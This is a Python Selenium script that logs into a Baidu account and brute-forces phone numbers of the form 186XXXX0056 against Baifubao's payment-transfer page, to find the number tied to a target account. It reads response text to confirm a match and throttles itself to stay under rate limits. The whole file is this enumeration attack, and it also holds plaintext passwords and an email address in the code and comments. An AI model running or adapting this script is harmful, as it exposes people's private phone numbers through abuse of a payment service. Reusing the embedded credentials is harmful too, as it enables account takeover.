from selenium import webdriver
from time import sleep

def login(browser):
    browser.get("https://passport.baidu.com/v2/?login")
    browser.maximize_window()

    sleep(2)

    browser.find_element_by_id("TANGRAM__PSP_3__footerULoginBtn").click()
    browser.find_element_by_name("userName").clear()
    browser.find_element_by_name("userName").send_keys('三淼服装')
    # browser.find_element_by_name("userName").send_keys('sep555@qq.com')
    sleep(2)
    browser.find_element_by_name("password").clear()
    browser.find_element_by_name("password").send_keys('!@sanmiao90')
    # browser.find_element_by_name("password").send_keys('Song19870919')
    sleep(5)
    browser.find_element_by_id("TANGRAM__PSP_3__submit").click()

browser = webdriver.Firefox()
login(browser)

for phonevarint in range(418,10000):
    phonevar = "186"+str(phonevarint).zfill(4)+"0056"
    print("正在测试:"+phonevar)
    sleep(10)
    browser.get("https://www.baifubao.com/wireless/0/transfer/0/wap/0/start/0?username="+phonevar)
    sleep(10)

    if(browser.page_source.find('系统正忙')>0):
        print("系统出错，目前号码: "+phonevar)
        break

    if(browser.page_source.find('不支持给自己转账')>0 or browser.page_source.find('三')>0):
        print("找到号码："+phonevar)
        break

    if phonevarint % 20 == 0:
        print("达到次数，正在等待。。。")
        sleep(1800)

browser.close()